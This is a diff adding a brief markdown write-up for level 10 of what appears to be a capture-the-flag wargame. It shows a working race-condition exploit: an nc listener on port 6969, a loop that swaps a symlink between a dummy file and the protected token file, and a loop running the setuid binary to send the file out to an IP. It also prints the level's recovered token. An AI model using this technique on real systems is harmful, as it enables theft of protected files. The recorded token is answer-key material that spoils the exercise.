@@ -1,0 +1,17 @@
+##LEVEL 10
+
+By executing the level10 file, it says it require to send a file to host if we have access on this file. So bsaically we have to provide a (almost) random file and as a second argument, an IP to connect with it on port 6969.
+
+In way to do it, we need to open the corresponding port, which is 6969.
+
+This can be done with `nc -l 6969`. However, its not doing anything yet.
+
+The server seems to randomly gives different inputs, including the token. So we decided to just loop on the connection and spam it until we get the token.
+
+chmod 777 . && touch a
+
+(while true; do ln -sf a b; ln -sf token b; done)&
+
+while true; do ./level10 b [ip]; done
+
+In some way, we can obtain the token : woupa2yuojeeaaed06riuj63c and log to flag10.
